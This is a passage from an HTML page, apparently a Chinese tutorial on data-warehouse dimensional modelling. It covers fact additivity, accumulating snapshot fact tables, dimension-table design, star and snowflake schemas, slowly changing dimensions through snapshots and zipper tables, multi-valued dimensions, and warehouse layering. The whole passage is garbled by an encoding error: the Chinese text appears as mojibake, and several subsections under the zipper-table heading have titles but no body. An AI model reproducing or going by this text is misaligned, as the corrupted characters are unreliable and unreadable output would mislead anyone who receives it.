äº‹å®æ˜¯æŒ‡å¯ä»¥æŒ‰ç…§ä¸äº‹å®è¡¨ç›¸å…³çš„æ‰€æœ‰ç»´åº¦è¿›è¡Œç´¯åŠ ï¼Œä¾‹å¦‚äº‹åŠ¡å‹äº‹å®è¡¨ä¸­çš„äº‹å®ã€‚</p><p><strong>2ï¼‰åŠå¯åŠ äº‹å®</strong></p><p>åŠå¯åŠ äº‹å®æ˜¯æŒ‡åªèƒ½æŒ‰ç…§ä¸äº‹å®è¡¨ç›¸å…³çš„ä¸€éƒ¨åˆ†ç»´åº¦è¿›è¡Œç´¯åŠ ï¼Œä¾‹å¦‚å‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨ä¸­çš„äº‹å®ã€‚ä»¥ä¸Šè¿°å„ä»“åº“ä¸­å„å•†å“çš„åº“å­˜æ¯å¤©å¿«ç…§äº‹å®è¡¨ä¸ºä¾‹ï¼Œè¿™å¼ è¡¨ä¸­çš„åº“å­˜äº‹å®å¯ä»¥æŒ‰ç…§ä»“åº“æˆ–è€…å•†å“ç»´åº¦è¿›è¡Œç´¯åŠ ï¼Œä½†æ˜¯ä¸èƒ½æŒ‰ç…§æ—¶é—´ç»´åº¦è¿›è¡Œç´¯åŠ ï¼Œå› ä¸ºå°†æ¯å¤©çš„åº“å­˜ç´¯åŠ èµ·æ¥æ˜¯æ²¡æœ‰ä»»ä½•æ„ä¹‰çš„ã€‚</p><p><strong>3ï¼‰ä¸å¯åŠ äº‹å®</strong></p><p>ä¸å¯åŠ äº‹å®æ˜¯æŒ‡å®Œå…¨ä¸å…·å¤‡å¯åŠ æ€§ï¼Œä¾‹å¦‚æ¯”ç‡å‹äº‹å®ã€‚ä¸å¯åŠ äº‹å®é€šå¸¸éœ€è¦è½¬åŒ–ä¸ºå¯åŠ äº‹å®ï¼Œä¾‹å¦‚æ¯”ç‡å¯è½¬åŒ–ä¸ºåˆ†å­å’Œåˆ†æ¯ã€‚</p><h3 id="ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨"><a href="#ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨" class="headerlink" title="ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨"></a>ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨</h3><h4 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>ç´¯è®¡å¿«ç…§äº‹å®è¡¨æ˜¯åŸºäºä¸€ä¸ªä¸šåŠ¡æµç¨‹ä¸­çš„å¤šä¸ªå…³é”®ä¸šåŠ¡è¿‡ç¨‹è”åˆå¤„ç†è€Œæ„å»ºçš„äº‹å®è¡¨ï¼Œå¦‚äº¤æ˜“æµç¨‹ä¸­çš„ä¸‹å•ã€æ”¯ä»˜ã€å‘è´§ã€ç¡®è®¤æ”¶è´§ä¸šåŠ¡è¿‡ç¨‹ã€‚</p><p>ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨é€šå¸¸å…·æœ‰å¤šä¸ªæ—¥æœŸå­—æ®µï¼Œæ¯ä¸ªæ—¥æœŸå¯¹åº”ä¸šåŠ¡æµç¨‹ä¸­çš„ä¸€ä¸ªå…³é”®ä¸šåŠ¡è¿‡ç¨‹ï¼ˆé‡Œç¨‹ç¢‘ï¼‰ã€‚</p><table><thead><tr><th>è®¢å•id</th><th>ç”¨æˆ·id</th><th>ä¸‹å•æ—¥æœŸ</th><th>æ”¯ä»˜æ—¥æœŸ</th><th>å‘è´§æ—¥æœŸ</th><th>ç¡®è®¤æ”¶è´§æ—¥æœŸ</th><th>è®¢å•é‡‘é¢</th><th>æ”¯ä»˜é‡‘é¢</th></tr></thead><tbody><tr><td>1001</td><td>1234</td><td>2020-06-14</td><td>2020-06-15</td><td>2020-06-16</td><td>2020-06-17</td><td>1000</td><td>1000</td></tr></tbody></table><p>ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨ä¸»è¦ç”¨äºåˆ†æä¸šåŠ¡è¿‡ç¨‹ï¼ˆé‡Œç¨‹ç¢‘ï¼‰ä¹‹é—´çš„æ—¶é—´é—´éš”ç­‰éœ€æ±‚ã€‚ä¾‹å¦‚å‰æ–‡æåˆ°çš„ç”¨æˆ·ä¸‹å•åˆ°æ”¯ä»˜çš„å¹³å‡æ—¶é—´é—´éš”ï¼Œä½¿ç”¨ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨è¿›è¡Œç»Ÿè®¡ï¼Œå°±èƒ½é¿å…ä¸¤ä¸ªäº‹åŠ¡äº‹å®è¡¨çš„å…³è”æ“ä½œï¼Œä»è€Œå˜å¾—ååˆ†ç®€å•é«˜æ•ˆã€‚</p><h4 id="è®¾è®¡æµç¨‹-2"><a href="#è®¾è®¡æµç¨‹-2" class="headerlink" title="è®¾è®¡æµç¨‹"></a>è®¾è®¡æµç¨‹</h4><p>ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨çš„è®¾è®¡æµç¨‹åŒäº‹åŠ¡å‹äº‹å®è¡¨ç±»ä¼¼ï¼Œä¹Ÿå¯é‡‡ç”¨ä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼Œä¸‹é¢é‡ç‚¹æè¿°ä¸äº‹åŠ¡å‹äº‹å®è¡¨çš„ä¸åŒä¹‹å¤„ã€‚</p><p><strong>é€‰æ‹©ä¸šåŠ¡è¿‡ç¨‹â†’å£°æ˜ç²’åº¦â†’ç¡®è®¤ç»´åº¦â†’ç¡®è®¤äº‹å®ã€‚</strong></p><p><strong>1ï¼‰é€‰æ‹©ä¸šåŠ¡è¿‡ç¨‹</strong></p><p>é€‰æ‹©ä¸€ä¸ªä¸šåŠ¡æµç¨‹ä¸­éœ€è¦å…³è”åˆ†æçš„å¤šä¸ªå…³é”®ä¸šåŠ¡è¿‡ç¨‹ï¼Œå¤šä¸ªä¸šåŠ¡è¿‡ç¨‹å¯¹åº”ä¸€å¼ ç´¯ç§¯å‹å¿«ç…§äº‹å®è¡¨ã€‚</p><p><strong>2ï¼‰å£°æ˜ç²’åº¦</strong></p><p>ç²¾ç¡®å®šä¹‰æ¯è¡Œæ•°æ®è¡¨ç¤ºçš„æ˜¯ä»€ä¹ˆï¼Œå°½é‡é€‰æ‹©æœ€å°ç²’åº¦ã€‚</p><p><strong>3ï¼‰ç¡®è®¤ç»´åº¦</strong></p><p>é€‰æ‹©ä¸å„ä¸šåŠ¡è¿‡ç¨‹ç›¸å…³çš„ç»´åº¦ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯å„ä¸šåŠ¡è¿‡ç¨‹å‡éœ€è¦ä¸€ä¸ªæ—¥æœŸç»´åº¦ã€‚</p><p><strong>4ï¼‰ç¡®è®¤äº‹å®</strong></p><p>é€‰æ‹©å„ä¸šåŠ¡è¿‡ç¨‹çš„åº¦é‡å€¼ã€‚</p><h2 id="ç¬¬4ç« -ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹ç»´åº¦è¡¨"><a href="#ç¬¬4ç« -ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹ç»´åº¦è¡¨" class="headerlink" title="ç¬¬4ç«  ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹ç»´åº¦è¡¨"></a>ç¬¬4ç«  ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹ç»´åº¦è¡¨</h2><h3 id="ç»´åº¦è¡¨æ¦‚è¿°"><a href="#ç»´åº¦è¡¨æ¦‚è¿°" class="headerlink" title="ç»´åº¦è¡¨æ¦‚è¿°"></a>ç»´åº¦è¡¨æ¦‚è¿°</h3><p>ç»´åº¦è¡¨æ˜¯ç»´åº¦å»ºæ¨¡çš„åŸºç¡€å’Œçµé­‚ã€‚å‰æ–‡æåˆ°ï¼Œäº‹å®è¡¨ç´§ç´§å›´ç»•ä¸šåŠ¡è¿‡ç¨‹è¿›è¡Œè®¾è®¡ï¼Œè€Œç»´åº¦è¡¨åˆ™å›´ç»•ä¸šåŠ¡è¿‡ç¨‹æ‰€å¤„çš„ç¯å¢ƒè¿›è¡Œè®¾è®¡ã€‚ç»´åº¦è¡¨ä¸»è¦åŒ…å«ä¸€ä¸ªä¸»é”®å’Œå„ç§ç»´åº¦å­—æ®µï¼Œç»´åº¦å­—æ®µç§°ä¸ºç»´åº¦å±æ€§ã€‚</p><h3 id="ç»´åº¦è¡¨è®¾è®¡æ­¥éª¤"><a href="#ç»´åº¦è¡¨è®¾è®¡æ­¥éª¤" class="headerlink" title="ç»´åº¦è¡¨è®¾è®¡æ­¥éª¤"></a>ç»´åº¦è¡¨è®¾è®¡æ­¥éª¤</h3><p><strong>1ï¼‰ç¡®å®šç»´åº¦ï¼ˆè¡¨ï¼‰</strong></p><p>åœ¨è®¾è®¡äº‹å®è¡¨æ—¶ï¼Œå·²ç»ç¡®å®šäº†ä¸æ¯ä¸ªäº‹å®è¡¨ç›¸å…³çš„ç»´åº¦ï¼Œç†è®ºä¸Šæ¯ä¸ªç›¸å…³ç»´åº¦å‡éœ€å¯¹åº”ä¸€å¼ ç»´åº¦è¡¨ã€‚éœ€è¦æ³¨æ„åˆ°ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ªäº‹å®è¡¨ä¸åŒä¸€ä¸ªç»´åº¦éƒ½ç›¸å…³çš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µéœ€ä¿è¯ç»´åº¦çš„å”¯ä¸€æ€§ï¼Œå³åªåˆ›å»ºä¸€å¼ ç»´åº¦è¡¨ã€‚å¦å¤–ï¼Œå¦‚æœæŸäº›ç»´åº¦è¡¨çš„ç»´åº¦å±æ€§å¾ˆå°‘ï¼Œä¾‹å¦‚åªæœ‰ä¸€ä¸ª**åç§°ï¼Œåˆ™å¯ä¸åˆ›å»ºè¯¥ç»´åº¦è¡¨ï¼Œè€ŒæŠŠè¯¥è¡¨çš„ç»´åº¦å±æ€§ç›´æ¥å¢åŠ åˆ°ä¸ä¹‹ç›¸å…³çš„äº‹å®è¡¨ä¸­ï¼Œè¿™ä¸ªæ“ä½œç§°ä¸º<strong>ç»´åº¦é€€åŒ–</strong>ã€‚</p><p><strong>2ï¼‰ç¡®å®šä¸»ç»´è¡¨å’Œç›¸å…³ç»´è¡¨</strong></p><p>æ­¤å¤„çš„ä¸»ç»´è¡¨å’Œç›¸å…³ç»´è¡¨å‡æŒ‡<strong>ä¸šåŠ¡ç³»ç»Ÿ</strong>ä¸­ä¸æŸç»´åº¦ç›¸å…³çš„è¡¨ã€‚ä¾‹å¦‚ä¸šåŠ¡ç³»ç»Ÿä¸­ä¸å•†å“ç›¸å…³çš„è¡¨æœ‰sku_infoï¼Œspu_infoï¼Œbase_trademarkï¼Œbase_category3ï¼Œbase_category2ï¼Œbase_category1ç­‰ï¼Œå…¶ä¸­sku_infoå°±ç§°ä¸ºå•†å“ç»´åº¦çš„ä¸»ç»´è¡¨ï¼Œå…¶ä½™è¡¨ç§°ä¸ºå•†å“ç»´åº¦çš„ç›¸å…³ç»´è¡¨ã€‚ç»´åº¦è¡¨çš„ç²’åº¦é€šå¸¸ä¸ä¸»ç»´è¡¨ç›¸åŒã€‚</p><p><strong>3ï¼‰ç¡®å®šç»´åº¦å±æ€§</strong></p><p>ç¡®å®šç»´åº¦å±æ€§å³ç¡®å®šç»´åº¦è¡¨å­—æ®µã€‚ç»´åº¦å±æ€§ä¸»è¦æ¥è‡ªäºä¸šåŠ¡ç³»ç»Ÿä¸­ä¸è¯¥ç»´åº¦å¯¹åº”çš„ä¸»ç»´è¡¨å’Œç›¸å…³ç»´è¡¨ã€‚ç»´åº¦å±æ€§å¯ç›´æ¥ä»ä¸»ç»´è¡¨æˆ–ç›¸å…³ç»´è¡¨ä¸­é€‰æ‹©ï¼Œä¹Ÿå¯é€šè¿‡è¿›ä¸€æ­¥åŠ å·¥å¾—åˆ°ã€‚</p><p>ç¡®å®šç»´åº¦å±æ€§æ—¶ï¼Œéœ€è¦éµå¾ªä»¥ä¸‹è¦æ±‚ï¼š</p><p><strong>ï¼ˆ1ï¼‰å°½å¯èƒ½ç”Ÿæˆä¸°å¯Œçš„ç»´åº¦å±æ€§</strong></p><p>ç»´åº¦å±æ€§æ˜¯åç»­åšåˆ†æç»Ÿè®¡æ—¶çš„æŸ¥è¯¢çº¦æŸæ¡ä»¶ã€åˆ†ç»„å­—æ®µçš„åŸºæœ¬æ¥æºï¼Œæ˜¯æ•°æ®æ˜“ç”¨æ€§çš„å…³é”®ã€‚ç»´åº¦å±æ€§çš„ä¸°å¯Œç¨‹åº¦ç›´æ¥å½±å“åˆ°æ•°æ®æ¨¡å‹èƒ½å¤Ÿæ”¯æŒçš„æŒ‡æ ‡çš„ä¸°å¯Œç¨‹åº¦ã€‚</p><p><strong>ï¼ˆ2ï¼‰å°½é‡ä¸ä½¿ç”¨ç¼–ç ï¼Œè€Œä½¿ç”¨æ˜ç¡®çš„æ–‡å­—è¯´æ˜ï¼Œä¸€èˆ¬å¯ä»¥ç¼–ç å’Œæ–‡å­—å…±å­˜ã€‚</strong></p><p><strong>ï¼ˆ3ï¼‰å°½é‡æ²‰æ·€å‡ºé€šç”¨çš„ç»´åº¦å±æ€§</strong></p><p>æœ‰äº›ç»´åº¦å±æ€§çš„è·å–éœ€è¦è¿›è¡Œæ¯”è¾ƒå¤æ‚çš„é€»è¾‘å¤„ç†ï¼Œä¾‹å¦‚éœ€è¦é€šè¿‡å¤šä¸ªå­—æ®µæ‹¼æ¥å¾—åˆ°ã€‚ä¸ºé¿å…åç»­æ¯æ¬¡ä½¿ç”¨æ—¶çš„é‡å¤å¤„ç†ï¼Œå¯å°†è¿™äº›ç»´åº¦å±æ€§æ²‰æ·€åˆ°ç»´åº¦è¡¨ä¸­ã€‚</p><h3 id="ç»´åº¦è®¾è®¡è¦ç‚¹"><a href="#ç»´åº¦è®¾è®¡è¦ç‚¹" class="headerlink" title="ç»´åº¦è®¾è®¡è¦ç‚¹"></a>ç»´åº¦è®¾è®¡è¦ç‚¹</h3><h4 id="è§„èŒƒåŒ–ä¸åè§„èŒƒåŒ–"><a href="#è§„èŒƒåŒ–ä¸åè§„èŒƒåŒ–" class="headerlink" title="è§„èŒƒåŒ–ä¸åè§„èŒƒåŒ–"></a>è§„èŒƒåŒ–ä¸åè§„èŒƒåŒ–</h4><p><strong>è§„èŒƒåŒ–</strong>æ˜¯æŒ‡ä½¿ç”¨ä¸€ç³»åˆ—èŒƒå¼è®¾è®¡æ•°æ®åº“çš„è¿‡ç¨‹ï¼Œå…¶ç›®çš„æ˜¯å‡å°‘æ•°æ®å†—ä½™ï¼Œå¢å¼ºæ•°æ®çš„ä¸€è‡´æ€§ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè§„èŒƒåŒ–ä¹‹åï¼Œä¸€å¼ è¡¨çš„å­—æ®µä¼šæ‹†åˆ†åˆ°å¤šå¼ è¡¨ã€‚</p><p><strong>åè§„èŒƒåŒ–</strong>æ˜¯æŒ‡å°†å¤šå¼ è¡¨çš„æ•°æ®å†—ä½™åˆ°ä¸€å¼ è¡¨ï¼Œå…¶ç›®çš„æ˜¯å‡å°‘joinæ“ä½œï¼Œæé«˜æŸ¥è¯¢æ€§èƒ½ã€‚</p><p>åœ¨è®¾è®¡ç»´åº¦è¡¨æ—¶ï¼Œå¦‚æœå¯¹å…¶è¿›è¡Œè§„èŒƒåŒ–ï¼Œå¾—åˆ°çš„ç»´åº¦æ¨¡å‹ç§°ä¸ºé›ªèŠ±æ¨¡å‹ï¼Œå¦‚æœå¯¹å…¶è¿›è¡Œåè§„èŒƒåŒ–ï¼Œå¾—åˆ°çš„æ¨¡å‹ç§°ä¸ºæ˜Ÿå‹æ¨¡å‹ã€‚</p><p>æ•°æ®ä»“åº“ç³»ç»Ÿçš„ä¸»è¦ç›®çš„æ˜¯ç”¨äºæ•°æ®åˆ†æå’Œç»Ÿè®¡ï¼Œæ‰€ä»¥æ˜¯å¦æ–¹ä¾¿ç”¨æˆ·è¿›è¡Œç»Ÿè®¡åˆ†æå†³å®šäº†æ¨¡å‹çš„ä¼˜åŠ£ã€‚é‡‡ç”¨é›ªèŠ±æ¨¡å‹ï¼Œç”¨æˆ·åœ¨ç»Ÿè®¡åˆ†æçš„è¿‡ç¨‹ä¸­éœ€è¦å¤§é‡çš„å…³è”æ“ä½œï¼Œä½¿ç”¨å¤æ‚åº¦é«˜ï¼ŒåŒæ—¶æŸ¥è¯¢æ€§èƒ½å¾ˆå·®ï¼Œè€Œé‡‡ç”¨æ˜Ÿå‹æ¨¡å‹ï¼Œåˆ™æ–¹ä¾¿ã€æ˜“ç”¨ä¸”æ€§èƒ½å¥½ã€‚æ‰€ä»¥å‡ºäºæ˜“ç”¨æ€§å’Œæ€§èƒ½çš„è€ƒè™‘ï¼Œç»´åº¦è¡¨ä¸€èˆ¬æ˜¯å¾ˆä¸è§„èŒƒåŒ–çš„ã€‚</p><h4 id="ç»´åº¦å˜åŒ–"><a href="#ç»´åº¦å˜åŒ–" class="headerlink" title="ç»´åº¦å˜åŒ–"></a>ç»´åº¦å˜åŒ–</h4><p>ç»´åº¦å±æ€§é€šå¸¸ä¸æ˜¯é™æ€çš„ï¼Œè€Œæ˜¯ä¼šéšæ—¶é—´å˜åŒ–çš„ï¼Œæ•°æ®ä»“åº“çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯åæ˜ å†å²çš„å˜åŒ–ï¼Œæ‰€ä»¥å¦‚ä½•ä¿å­˜ç»´åº¦çš„å†å²çŠ¶æ€æ˜¯ç»´åº¦è®¾è®¡çš„é‡è¦å·¥ä½œä¹‹ä¸€ã€‚ä¿å­˜ç»´åº¦æ•°æ®çš„å†å²çŠ¶æ€ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹ä¸¤ç§åšæ³•ï¼Œåˆ†åˆ«æ˜¯å…¨é‡å¿«ç…§è¡¨å’Œæ‹‰é“¾è¡¨ã€‚</p><p><strong>1ï¼‰å…¨é‡å¿«ç…§è¡¨</strong></p><p>ç¦»çº¿æ•°æ®ä»“åº“çš„è®¡ç®—å‘¨æœŸé€šå¸¸ä¸ºæ¯å¤©ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥æ¯å¤©ä¿å­˜ä¸€ä»½å…¨é‡çš„ç»´åº¦æ•°æ®ã€‚è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹å’Œç¼ºç‚¹éƒ½å¾ˆæ˜æ˜¾ã€‚</p><p>ä¼˜ç‚¹æ˜¯ç®€å•è€Œæœ‰æ•ˆï¼Œå¼€å‘å’Œç»´æŠ¤æˆæœ¬ä½ï¼Œä¸”æ–¹ä¾¿ç†è§£å’Œä½¿ç”¨ã€‚</p><p>ç¼ºç‚¹æ˜¯æµªè´¹å­˜å‚¨ç©ºé—´ï¼Œå°¤å…¶æ˜¯å½“æ•°æ®çš„å˜åŒ–æ¯”ä¾‹æ¯”è¾ƒä½æ—¶ã€‚</p><p><strong>2ï¼‰æ‹‰é“¾è¡¨</strong></p><p>æ‹‰é“¾è¡¨çš„æ„ä¹‰å°±åœ¨äºèƒ½å¤Ÿæ›´åŠ é«˜æ•ˆçš„ä¿å­˜ç»´åº¦ä¿¡æ¯çš„å†å²çŠ¶æ€ã€‚</p><p><strong>ï¼ˆ1ï¼‰ä»€ä¹ˆæ˜¯æ‹‰é“¾è¡¨</strong></p><p><strong>ï¼ˆ2ï¼‰ä¸ºä»€ä¹ˆè¦åšæ‹‰é“¾è¡¨</strong></p><p><strong>ï¼ˆ3ï¼‰å¦‚ä½•ä½¿ç”¨æ‹‰é“¾è¡¨</strong></p><h4 id="å¤šå€¼ç»´åº¦"><a href="#å¤šå€¼ç»´åº¦" class="headerlink" title="å¤šå€¼ç»´åº¦"></a>å¤šå€¼ç»´åº¦</h4><p>å¦‚æœäº‹å®è¡¨ä¸­ä¸€æ¡è®°å½•åœ¨æŸä¸ªç»´åº¦è¡¨ä¸­æœ‰å¤šæ¡è®°å½•ä¸ä¹‹å¯¹åº”ï¼Œç§°ä¸ºå¤šå€¼ç»´åº¦ã€‚ä¾‹å¦‚ï¼Œä¸‹å•äº‹å®è¡¨ä¸­çš„ä¸€æ¡è®°å½•ä¸ºä¸€ä¸ªè®¢å•ï¼Œä¸€ä¸ªè®¢å•å¯èƒ½åŒ…å«å¤šä¸ªå•†å“ï¼Œæ‰€ä¼šå•†å“ç»´åº¦è¡¨ä¸­å°±å¯èƒ½æœ‰å¤šæ¡æ•°æ®ä¸ä¹‹å¯¹åº”ã€‚</p><p>é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œé€šå¸¸é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ¡ˆè§£å†³ã€‚</p><p>ç¬¬ä¸€ç§ï¼šé™ä½äº‹å®è¡¨çš„ç²’åº¦ï¼Œä¾‹å¦‚å°†è®¢å•äº‹å®è¡¨çš„ç²’åº¦ç”±ä¸€ä¸ªè®¢å•é™ä½ä¸ºä¸€ä¸ªè®¢å•ä¸­çš„ä¸€ä¸ªå•†å“é¡¹ã€‚</p><p>ç¬¬äºŒç§ï¼šåœ¨äº‹å®è¡¨ä¸­é‡‡ç”¨å¤šå­—æ®µä¿å­˜å¤šä¸ªç»´åº¦å€¼ï¼Œæ¯ä¸ªå­—æ®µä¿å­˜ä¸€ä¸ªç»´åº¦idã€‚è¿™ç§æ–¹æ¡ˆåªé€‚ç”¨äºå¤šå€¼ç»´åº¦ä¸ªæ•°å›ºå®šçš„æƒ…å†µã€‚</p><p>å»ºè®®å°½é‡é‡‡ç”¨ç¬¬ä¸€ç§æ–¹æ¡ˆè§£å†³å¤šå€¼ç»´åº¦é—®é¢˜ã€‚</p><h4 id="å¤šå€¼å±æ€§"><a href="#å¤šå€¼å±æ€§" class="headerlink" title="å¤šå€¼å±æ€§"></a>å¤šå€¼å±æ€§</h4><p>ç»´è¡¨ä¸­çš„æŸä¸ªå±æ€§åŒæ—¶æœ‰å¤šä¸ªå€¼ï¼Œç§°ä¹‹ä¸ºâ€œå¤šå€¼å±æ€§â€ï¼Œä¾‹å¦‚å•†å“ç»´åº¦çš„å¹³å°å±æ€§å’Œé”€å”®å±æ€§ï¼Œæ¯ä¸ªå•†å“å‡æœ‰å¤šä¸ªå±æ€§å€¼ã€‚</p><p>é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œé€šå¸¸æœ‰å¯ä»¥é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ¡ˆã€‚</p><p>ç¬¬ä¸€ç§ï¼šå°†å¤šå€¼å±æ€§æ”¾åˆ°ä¸€ä¸ªå­—æ®µï¼Œè¯¥å­—æ®µå†…å®¹ä¸ºkey1:value1ï¼Œkey2:value2çš„å½¢å¼ï¼Œä¾‹å¦‚ä¸€ä¸ªæ‰‹æœºå•†å“çš„å¹³å°å±æ€§å€¼ä¸ºâ€œå“ç‰Œ:åä¸ºï¼Œç³»ç»Ÿ:é¸¿è’™ï¼ŒCPU:éº’éºŸ990â€ã€‚</p><p>ç¬¬äºŒç§ï¼šå°†å¤šå€¼å±æ€§æ”¾åˆ°å¤šä¸ªå­—æ®µï¼Œæ¯ä¸ªå­—æ®µå¯¹åº”ä¸€ä¸ªå±æ€§ã€‚è¿™ç§æ–¹æ¡ˆåªé€‚ç”¨äºå¤šå€¼å±æ€§ä¸ªæ•°å›ºå®šçš„æƒ…å†µã€‚</p><h2 id="ç¬¬5ç« -æ•°æ®ä»“åº“è®¾è®¡"><a href="#ç¬¬5ç« -æ•°æ®ä»“åº“è®¾è®¡" class="headerlink" title="ç¬¬5ç«  æ•°æ®ä»“åº“è®¾è®¡"></a>ç¬¬5ç«  æ•°æ®ä»“åº“è®¾è®¡</h2><h3 id="æ•°æ®ä»“åº“åˆ†å±‚è§„åˆ’"><a href="#æ•°æ®ä»“åº“åˆ†å±‚è§„åˆ’" class="headerlink" title="æ•°æ®ä»“åº“åˆ†å±‚è§„åˆ’"></a>æ•°æ®ä»“åº“åˆ†å±‚è§„åˆ’</h3><p>ä¼˜ç§€å¯é çš„æ•°ä»“ä½“ç³»ï¼Œéœ€è¦è‰¯å¥½çš„æ•°æ®åˆ†å±‚ç»“æ„ã€‚åˆç†çš„åˆ†å±‚ï¼Œèƒ½å¤Ÿä½¿æ•°æ®ä½“ç³»æ›´åŠ æ¸…æ™°ï¼Œä½¿å¤æ‚é—®é¢˜å¾—ä»¥ç®€åŒ–ã€‚ä»¥ä¸‹æ˜¯è¯¥é¡¹ç›®çš„åˆ†å±‚è§„åˆ’ã€‚</p><h3 id="æ•°æ®ä»“åº“æ„å»ºæµç¨‹"><a href="#æ•°æ®ä»“åº“æ„å»ºæµç¨‹" class="headerlink" title="æ•°æ®ä»“åº“æ„å»ºæµç¨‹"></a>æ•°æ®ä»“åº“æ„å»ºæµç¨‹</h3><p>ä»¥ä¸‹æ˜¯æ„å»ºæ•°æ®ä»“åº“çš„å®Œæ•´æµç¨‹ã€‚</p><h4 id="æ•°æ®è°ƒç ”"><a href="#æ•°æ®è°ƒç ”" class="headerlink" title="æ•°æ®è°ƒç ”"></a>æ•°æ®è°ƒç ”</h4><p>æ•°æ®è°ƒç ”é‡ç‚¹è¦åšä¸¤é¡¹å·¥ä½œï¼Œåˆ†åˆ«æ˜¯ä¸šåŠ¡è°ƒç ”å’Œéœ€æ±‚åˆ†æã€‚è¿™ä¸¤é¡¹å·¥ä½œåšçš„æ˜¯å¦å……åˆ†ï¼Œç›´æ¥å½±å“ç€æ•°æ®ä»“åº“çš„è´¨é‡ã€‚</p><p><strong>1ï¼‰ä¸šåŠ¡è°ƒç ”</strong></p><p>ä¸šåŠ¡è°ƒç ”çš„ä¸»è¦ç›®æ ‡æ˜¯<strong>ç†Ÿæ‚‰ä¸šåŠ¡æµç¨‹</strong>ã€<strong>ç†Ÿæ‚‰ä¸šåŠ¡æ•°æ®</strong>ã€‚</p><p><strong>ç†Ÿæ‚‰ä¸šåŠ¡æµç¨‹</strong>è¦æ±‚åšåˆ°ï¼Œæ˜ç¡®æ¯ä¸ªä¸šåŠ¡çš„å…·ä½“æµç¨‹ï¼Œéœ€è¦å°†è¯¥ä¸šåŠ¡æ‰€åŒ…å«çš„æ¯ä¸ª<strong>ä¸šåŠ¡è¿‡ç¨‹</strong>ä¸€ä¸€åˆ—ä¸¾å‡ºæ¥ã€‚</p><p><strong>ç†Ÿæ‚‰ä¸šåŠ¡æ•°æ®</strong>è¦æ±‚åšåˆ°ï¼Œå°†æ•°æ®ï¼ˆåŒ…æ‹¬åŸ‹ç‚¹æ—¥å¿—å’Œä¸šåŠ¡æ•°æ®è¡¨ï¼‰ä¸ä¸šåŠ¡è¿‡ç¨‹å¯¹åº”èµ·æ¥ï¼Œæ˜ç¡®æ¯ä¸ªä¸šåŠ¡è¿‡ç¨‹ä¼šå¯¹å“ªäº›è¡¨çš„æ•°æ®äº§ç”Ÿå½±å“ï¼Œä»¥åŠäº§ç”Ÿä»€ä¹ˆå½±å“ã€‚äº§ç”Ÿçš„å½±å“ï¼Œéœ€è¦å…·ä½“åˆ°ï¼Œæ˜¯æ–°å¢ä¸€æ¡æ•°æ®ï¼Œè¿˜æ˜¯ä¿®æ”¹ä¸€æ¡æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦æ˜ç¡®æ–°å¢çš„å†…å®¹æˆ–è€…æ˜¯ä¿®æ”¹çš„é€»è¾‘ã€‚</p><p>ä¸‹é¢ä¸šåŠ¡ç”µå•†ä¸­çš„äº¤æ˜“ä¸ºä¾‹è¿›è¡Œæ¼”ç¤ºï¼Œäº¤æ˜“ä¸šåŠ¡æ¶‰åŠåˆ°çš„ä¸šåŠ¡è¿‡ç¨‹æœ‰ä¹°å®¶ä¸‹å•ã€ä¹°å®¶æ”¯ä»˜ã€å–å®¶å‘è´§ï¼Œä¹°å®¶æ”¶è´§ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹å›¾ã€‚</p><p><strong>2ï¼‰éœ€æ±‚åˆ†æ</strong></p><p>å…¸å‹çš„éœ€æ±‚æŒ‡æ ‡å¦‚ï¼Œæœ€è¿‘ä¸€å¤©å„çœä»½æ‰‹æœºå“ç±»è®¢å•æ€»é¢ã€‚</p><p>åˆ†æéœ€æ±‚æ—¶ï¼Œéœ€è¦æ˜ç¡®éœ€æ±‚æ‰€éœ€çš„<strong>ä¸šåŠ¡è¿‡ç¨‹</strong>åŠ<strong>ç»´åº¦</strong>ï¼Œä¾‹å¦‚è¯¥éœ€æ±‚æ‰€éœ€çš„ä¸šåŠ¡è¿‡ç¨‹å°±æ˜¯ä¹°å®¶ä¸‹å•ï¼Œæ‰€éœ€çš„ç»´åº¦æœ‰æ—¥æœŸï¼Œçœä»½ï¼Œå•†å“å“ç±»ã€‚</p><p><strong>3ï¼‰æ€»ç»“</strong></p><p>åšå®Œä¸šåŠ¡åˆ†æå’Œéœ€æ±‚åˆ†æä¹‹åï¼Œè¦ä¿è¯æ¯ä¸ªéœ€æ±‚éƒ½èƒ½æ‰¾åˆ°ä¸ä¹‹å¯¹åº”çš„ä¸šåŠ¡è¿‡ç¨‹åŠç»´åº¦ã€‚è‹¥ç°æœ‰æ•°æ®æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œåˆ™éœ€è¦å’Œä¸šåŠ¡æ–¹è¿›è¡Œæ²Ÿé€šï¼Œä¾‹å¦‚æŸä¸ªé¡µé¢éœ€è¦æ–°å¢æŸä¸ªè¡Œä¸ºçš„åŸ‹ç‚¹ã€‚</p><h4 id="æ˜ç¡®æ•°æ®åŸŸ"><a href="#æ˜ç¡®æ•°æ®åŸŸ" class="headerlink" 